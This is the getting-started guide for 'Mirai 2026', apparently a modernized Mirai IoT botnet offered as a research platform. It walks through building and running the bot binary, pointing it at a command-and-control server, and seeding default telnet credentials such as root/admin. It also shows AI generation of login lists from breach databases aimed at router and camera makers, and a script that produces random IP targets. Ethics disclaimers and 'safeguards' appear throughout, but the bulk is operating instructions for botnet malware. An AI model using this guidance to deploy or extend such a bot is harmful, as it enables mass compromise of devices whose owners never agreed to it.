# Getting Started with Mirai 2026

**Welcome to Mirai 2026!** This guide will help you get up and running with the modernized IoT research platform.

## ⚠️ Before You Begin

**CRITICAL**: This is a research tool. Before proceeding:

1. ✅ Read and understand the [LICENSE](LICENSE)
2. ✅ Ensure you have **written authorization** for any testing
3. ✅ Set up an **isolated test environment** (air-gapped or VPN-isolated)
4. ✅ Review ethical guidelines in [CONTRIBUTING.md](CONTRIBUTING.md)
5. ✅ Understand your legal obligations

**Unauthorized use is illegal and unethical.**

---

## Quick Start (5 Minutes)

### 1. Prerequisites

**Ubuntu/Debian:**
```bash
sudo apt-get update
sudo apt-get install -y \
    build-essential \
    cmake \
    git \
    libjson-c-dev \
    libsodium-dev \
    docker.io \
    docker-compose
```

**macOS:**
```bash
brew install cmake json-c libsodium docker docker-compose
```

**Fedora/RHEL:**
```bash
sudo dnf install -y \
    gcc \
    cmake \
    json-c-devel \
    libsodium-devel \
    docker \
    docker-compose
```

### 2. Clone Repository

```bash
git clone https://github.com/your-org/mirai-2026.git
cd mirai-2026
```

### 3. Build

```bash
# Quick build
make release

# Or with tests
make debug
make test
```

### 4. Configure

```bash
# Copy example config
cp config/bot.example.json config/bot.json

# Edit configuration
vim config/bot.json
```

**Minimum required changes:**
- Update `network.cnc_domain` to your C&C server
- Configure `safeguards.allowed_networks` to your test network
- Set `safeguards.enabled` to `true`

### 5. Run

```bash
# Run bot
./build/release/src/bot/mirai_bot --config config/bot.json

# Or in debug mode
./build/debug/src/bot/mirai_bot --config config/bot.json --debug
```

---

## Docker Quick Start (Recommended)

### 1. Build Containers

```bash
make docker
```

### 2. Start Development Stack

```bash
docker-compose up -d
```

This starts:
- PostgreSQL database
- Redis cache
- Prometheus metrics
- Grafana dashboards
- Loki log aggregation
- Jaeger tracing
- AI service (Python)

### 3. Access Services

| Service | URL | Credentials |
|---------|-----|-------------|
| Grafana | http://localhost:3000 | admin / admin |
| Prometheus | http://localhost:9090 | - |
| Jaeger UI | http://localhost:16686 | - |
| AI Service | http://localhost:8000 | - |

### 4. View Logs

```bash
# All services
docker-compose logs -f

# Specific service
docker-compose logs -f ai-service
```

### 5. Stop

```bash
docker-compose down
```

---

## Configuration Guide

### Basic Configuration

**config/bot.json:**
```json
{
  "component": "mirai-bot",
  
  "network": {
    "cnc_domain": "YOUR_CNC_SERVER",
    "cnc_port": 23,
    "use_encryption": true
  },
  
  "credentials": {
    "list": [
      {"username": "root", "password": "admin", "weight": 10}
    ],
    "ai_generation_enabled": false
  },
  
  "scanner": {
    "max_connections": 256,
    "scan_rate_pps": 160,
    "timeout_seconds": 30
  },
  
  "safeguards": {
    "enabled": true,
    "allowed_networks": ["192.168.100.0/24"],
    "max_runtime_seconds": 3600
  }
}
```

### Research Safeguards (REQUIRED)

**Always configure safeguards:**

```json
{
  "safeguards": {
    "enabled": true,
    
    // Only scan these networks
    "allowed_networks": [
      "192.168.100.0/24",
      "10.0.50.0/24"
    ],
    
    // Auto-shutdown after 1 hour
    "max_runtime_seconds": 3600,
    
    // Require authorization token
    "require_authorization": true,
    
    // Emergency kill switch URL
    "kill_switch_url": "https://your-killswitch.example.com/check"
  }
}
```

---

## AI Features

### Generate Credentials with AI

```bash
# Install Python dependencies
pip install -r ai/requirements.txt

# Generate credentials for routers
python ai/credential_intel/generate.py \
  --target-type router \
  --output config/credentials.json

# With manufacturer targeting
python ai/credential_intel/generate.py \
  --manufacturer tp-link \
  --output config/credentials.json

# With breach database
python ai/credential_intel/generate.py \
  --breach-db /data/breaches.db \
  --target-type camera \
  --output config/credentials.json
```

### Use Generated Credentials

Update `config/bot.json`:
```json
{
  "credentials": {
    "ai_generation_enabled": true,
    "ai_model_path": "/models/credential-gen",
    "breach_database_path": "/data/breaches.db"
  }
}
```

---

## Development Workflow

### 1. Set Up Development Environment

```bash
# Build in debug mode
make debug

# Generate compile_commands.json for IDE
make compile_commands
```

### 2. Code Style

```bash
# Format code
make format

# Run linter
make lint
```

### 3. Testing

```bash
# Run all tests
make test

# Run with sanitizers
./build/debug/src/bot/mirai_bot --config config/bot.json

# Run specific test
cd build/debug
ctest -R test_scanner
```

### 4. Debugging

```bash
# With GDB
gdb --args ./build/debug/src/bot/mirai_bot --config config/bot.json

# With Valgrind
valgrind --leak-check=full \
  ./build/debug/src/bot/mirai_bot --config config/bot.json
```

---

## Observability

### View Metrics (Prometheus)

```bash
# Access Prometheus
open http://localhost:9090

# Example queries
mirai_scans_total
rate(mirai_scans_total[5m])
mirai_credentials_success_rate
```

### Dashboards (Grafana)

```bash
# Access Grafana
open http://localhost:3000

# Login: admin / admin
# Dashboards → Mirai 2026
```

**Pre-built dashboards:**
- Bot performance
- Scan statistics
- AI service metrics
- Infrastructure health

### Logs (Loki)

```bash
# Access via Grafana
# Explore → Loki
# Query: {component="mirai-bot"}
```

### Tracing (Jaeger)

```bash
# Access Jaeger
open http://localhost:16686

# Search for traces by service
```

---

## Common Tasks

### Generate Test Data

```bash
# Generate 1000 random IPs
python scripts/generate_targets.py \
  --count 1000 \
  --output targets.txt
```

### Export Metrics

```bash
# Export Prometheus metrics
curl http://localhost:9090/api/v1/query?query=mirai_scans_total
```

### Backup Configuration

```bash
# Backup all configs
tar czf mirai-config-backup.tar.gz config/
```

### Update Credentials

```bash
# Regenerate credentials
python ai/credential_intel/generate.py \
  --output config/credentials.json

# Reload bot (if hot-reload enabled)
kill -SIGHUP $(pgrep mirai_bot)
```

---

## Troubleshooting

### Build Issues

**Error: json-c not found**
```bash
# Ubuntu/Debian
sudo apt-get install libjson-c-dev

# macOS
brew install json-c
```

**Error: libsodium not found**
```bash
# Ubuntu/Debian
sudo apt-get install libsodium-dev

# macOS
brew install libsodium
```

### Runtime Issues

**Bot won't start**
```bash
# Check config syntax
python -m json.tool config/bot.json

# Run with verbose logging
./build/debug/src/bot/mirai_bot \
  --config config/bot.json \
  --debug
```

**No scans happening**
```bash
# Check safeguards
grep -A5 "safeguards" config/bot.json

# Verify network access
ping YOUR_CNC_DOMAIN
```

**Permission denied**
```bash
# Raw sockets require root
sudo ./build/release/src/bot/mirai_bot \
  --config config/bot.json
```

### Docker Issues

**Port already in use**
```bash
# Check what's using the port
sudo lsof -i :3000

# Change port in docker-compose.yml
```

**Container won't start**
```bash
# Check logs
docker-compose logs service-name

# Rebuild
docker-compose build --no-cache
```

---

## Security Best Practices

### 1. Network Isolation

✅ **Do:**
- Use air-gapped test networks
- Configure VPN isolation
- Set up firewall rules

❌ **Don't:**
- Connect to production networks
- Test on the public internet
- Disable safeguards

### 2. Credential Management

✅ **Do:**
- Store credentials in config files
- Use strong encryption keys
- Rotate keys regularly

❌ **Don't:**
- Hardcode credentials
- Commit secrets to Git
- Share credential databases publicly

### 3. Logging & Auditing

✅ **Do:**
- Enable comprehensive logging
- Store audit logs securely
- Review logs regularly

❌ **Don't:**
- Disable audit logging
- Store logs in public locations
- Delete audit trails

---

## Next Steps

### For Researchers

1. **Read the architecture**: [docs/ARCHITECTURE.md](docs/ARCHITECTURE.md)
2. **Review ethical guidelines**: [CONTRIBUTING.md](CONTRIBUTING.md)
3. **Explore AI features**: [ai/README.md](ai/README.md)
4. **Set up test environment**: Isolated network with IoT device emulators

### For Developers

1. **Read contribution guide**: [CONTRIBUTING.md](CONTRIBUTING.md)
2. **Set up development environment**: `make debug`
3. **Run tests**: `make test`
4. **Pick an issue**: Check GitHub Issues for "good first issue"

### For Educators

1. **Review teaching materials**: `docs/education/`
2. **Set up classroom environment**: Docker Compose
3. **Create exercises**: Based on the architecture
4. **Emphasize ethics**: Use LICENSE and safeguards

---

## Resources

### Documentation

- [README-2026.md](README-2026.md) - Project overview
- [ARCHITECTURE.md](docs/ARCHITECTURE.md) - System architecture
- [CONTRIBUTING.md](CONTRIBUTING.md) - Contribution guidelines
- [LICENSE](LICENSE) - Research license
- [IMPLEMENTATION_SUMMARY.md](IMPLEMENTATION_SUMMARY.md) - What we built

### External Resources

- [Mirai Source Code Analysis](https://blog.malwaremustdie.org/2016/08/mmd-0056-2016-linuxmirai-just.html)
- [IoT Security Best Practices](https://www.nist.gov/programs-projects/nist-cybersecurity-iot-program)
- [Ethical Hacking Guidelines](https://www.sans.org/white-papers/)
- [Responsible Disclosure](https://en.wikipedia.org/wiki/Responsible_disclosure)

---

## Support

### Community

- **GitHub Discussions**: Ask questions, share ideas
- **GitHub Issues**: Bug reports, feature requests
- **Discord**: [Invite link] (coming soon)

### Professional

- **Security Issues**: security@example.com
- **Research Collaboration**: research@example.com
- **Ethics Questions**: ethics@example.com

---

## License

This project is licensed under the Mirai 2026 Research License.

**You may:**
- ✅ Use for research and education
- ✅ Modify and improve
- ✅ Conduct authorized testing

**You may NOT:**
- ❌ Use for unauthorized access
- ❌ Deploy maliciously
- ❌ Violate laws or regulations

See [LICENSE](LICENSE) for complete terms.

---

**Welcome to Mirai 2026! Let's make the internet more secure through responsible research. 🔒**
